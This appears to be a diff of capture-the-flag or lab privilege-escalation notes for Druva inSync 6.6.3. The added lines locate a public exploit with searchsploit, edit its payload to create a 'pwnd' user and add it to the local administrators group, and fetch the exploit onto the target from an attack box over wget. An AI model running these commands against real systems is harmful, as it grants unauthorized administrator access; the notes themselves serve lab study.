@@ -302,11 +302,12 @@ wmic product get name,version,vendor
 https://packetstorm.news/files/id/160404
 searchsploit Druva inSync 6.6.3
 searchsploit -m windows/local/49211.ps1
-2️⃣ # Transfer of malicious file to the victim system
-
-
+2️⃣ # Change payload 
+$cmd = "net user pwnd /add" --> $cmd = "net user pwnd P@ssw0rd /add & net localgroup administrators pwnd /add"
+3️⃣ # Transfer of malicious file to the victim system
 python3 -m http.server # attackbox
-wget http://10.11.99.141:8000/rev-svc3.exe -O C:\Users\thm-unpriv\rev-svc3.exe # target system
+wget http://10.11.99.141:8000/49211.ps1 -O C:\Users\thm-unpriv\49211.ps1 # target system
+4️⃣ # Run of Explotit with Powershell
 
 
 ```
